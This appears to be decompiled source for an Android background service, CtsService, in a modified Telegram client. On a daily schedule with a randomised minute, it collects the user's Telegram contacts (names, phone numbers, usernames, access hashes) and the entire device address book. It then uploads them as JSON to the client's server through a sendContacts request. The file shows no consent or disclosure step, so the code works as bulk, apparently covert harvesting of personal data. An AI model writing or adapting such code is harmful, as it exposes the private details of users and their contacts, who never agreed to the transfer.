package org.telegram.customization.service;

import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.provider.ContactsContract.CommonDataKinds.Phone;
import android.provider.ContactsContract.Contacts;
import android.text.TextUtils;
import com.google.gson.Gson;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.Iterator;
import org.telegram.customization.Internet.HandleRequest;
import org.telegram.customization.Internet.IResponseReceiver;
import org.telegram.customization.Model.ContactHelper;
import org.telegram.messenger.ContactsController;
import org.telegram.messenger.MessagesController;
import org.telegram.messenger.NotificationCenter;
import org.telegram.messenger.NotificationCenter.NotificationCenterDelegate;
import org.telegram.tgnet.TLRPC$TL_contact;
import org.telegram.tgnet.TLRPC.User;
import utils.Utilities;
import utils.app.AppPreferences;
import utils.view.Constants;

public class CtsService extends BaseService implements IResponseReceiver, NotificationCenterDelegate {
    boolean isForce = false;

    public static Calendar getCalender() {
        Calendar calendar = Calendar.getInstance();
        calendar.set(11, 10);
        calendar.set(12, Utilities.getRandomMinute());
        calendar.set(13, 0);
        return calendar;
    }

    public static void registerService(Context context) {
        registerService(context, new Intent(context, CtsService.class), getCalender(), 86400000);
    }

    public IBinder onBind(Intent intent) {
        return null;
    }

    public void onCreate() {
        super.onCreate();
    }

    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent != null) {
            this.isForce = intent.getBooleanExtra(Constants.EXTRA_IS_FORCE, false);
        }
        if (!AppPreferences.isRegistered(this)) {
            stopSelf();
            try {
                NotificationCenter.getInstance().removeObserver(this, NotificationCenter.contactsDidLoaded);
            } catch (Exception e) {
            }
            return super.onStartCommand(intent, flags, startId);
        } else if (this.isForce || checkTimeForSend()) {
            try {
                NotificationCenter.getInstance().addObserver(this, NotificationCenter.contactsDidLoaded);
            } catch (Exception e2) {
                e2.printStackTrace();
            }
            ContactsController.getInstance().loadContacts(true, 0);
            return 1;
        } else {
            NotificationCenter.getInstance().removeObserver(this, NotificationCenter.contactsDidLoaded);
            stopSelf();
            return 1;
        }
    }

    public void onResult(Object object, int StatusCode) {
        switch (StatusCode) {
            case 14:
                AppPreferences.setLastSuccessFullyTimeSyncContact(getApplicationContext(), System.currentTimeMillis());
                break;
        }
        stopSelf();
    }

    public void didReceivedNotification(final int id, Object... args) {
        new Thread() {

            /* renamed from: org.telegram.customization.service.CtsService$1$1 */
            class C12111 implements Runnable {
                C12111() {
                }

                public void run() {
                    NotificationCenter.getInstance().removeObserver(CtsService.this, NotificationCenter.contactsDidLoaded);
                    CtsService.this.stopSelf();
                }
            }

            public void run() {
                super.run();
                Handler handler = null;
                try {
                    handler = new Handler(Looper.getMainLooper());
                } catch (Exception e) {
                }
                if (id == NotificationCenter.contactsDidLoaded) {
                    try {
                        ContactsController.getInstance().updateUnregisteredContacts(new ArrayList());
                        ArrayList<TLRPC$TL_contact> i = ContactsController.getInstance().contacts;
                        ArrayList<ContactHelper> contactHelpers = new ArrayList();
                        Iterator it = i.iterator();
                        while (it.hasNext()) {
                            User user = MessagesController.getInstance().getUser(Integer.valueOf(((TLRPC$TL_contact) it.next()).user_id));
                            if (user != null) {
                                ContactHelper helper = new ContactHelper();
                                helper.setId(user.id);
                                String name = "";
                                String lastName = "";
                                if (!(user.first_name == null || TextUtils.isEmpty(user.first_name))) {
                                    name = user.first_name;
                                }
                                if (!(user.last_name == null || TextUtils.isEmpty(user.last_name))) {
                                    lastName = user.last_name;
                                }
                                helper.setName(name + " " + lastName);
                                helper.setMobile(user.phone);
                                helper.setUsername(user.username);
                                helper.setAccessHash(user.access_hash);
                                contactHelpers.add(helper);
                            }
                        }
                        try {
                            it = CtsService.this.getContactList().iterator();
                            while (it.hasNext()) {
                                contactHelpers.add((ContactHelper) it.next());
                            }
                        } catch (Exception e2) {
                        }
                        if (contactHelpers.size() > 0) {
                            String json = new Gson().toJson(contactHelpers);
                            if (!TextUtils.isEmpty(json)) {
                                if (CtsService.this.isForce || CtsService.this.checkTimeForSend()) {
                                    HandleRequest.getNew(CtsService.this.getApplicationContext(), CtsService.this).sendContacts(json);
                                }
                            }
                        } else if (handler != null) {
                            handler.post(new C12111());
                        }
                    } catch (Exception e3) {
                        e3.printStackTrace();
                    }
                }
            }
        }.start();
        NotificationCenter.getInstance().removeObserver(this, NotificationCenter.contactsDidLoaded);
    }

    public boolean checkTimeForSend() {
        if (AppPreferences.getContactSyncPeriod(getApplicationContext()) + AppPreferences.getLastSuccessFullyTimeSyncContact(this) < System.currentTimeMillis()) {
            return true;
        }
        return false;
    }

    private ArrayList<ContactHelper> getContactList() {
        int count;
        ArrayList<ContactHelper> contactHelpers = new ArrayList();
        ContentResolver cr = getContentResolver();
        Cursor cur = cr.query(Contacts.CONTENT_URI, null, null, null, null);
        if (cur != null) {
            count = cur.getCount();
        } else {
            count = 0;
        }
        if (count > 0) {
            while (cur != null && cur.moveToNext()) {
                String id = cur.getString(cur.getColumnIndex("_id"));
                String name = cur.getString(cur.getColumnIndex("display_name"));
                if (cur.getInt(cur.getColumnIndex("has_phone_number")) > 0) {
                    Cursor pCur = cr.query(Phone.CONTENT_URI, null, "contact_id = ?", new String[]{id}, null);
                    while (pCur.moveToNext()) {
                        String phoneNo = pCur.getString(pCur.getColumnIndex("data1"));
                        ContactHelper helper = new ContactHelper();
                        helper.setId(9999);
                        helper.setName(name);
                        helper.setMobile(phoneNo);
                        contactHelpers.add(helper);
                    }
                    pCur.close();
                }
            }
        }
        if (cur != null) {
            cur.close();
        }
        return contactHelpers;
    }
}
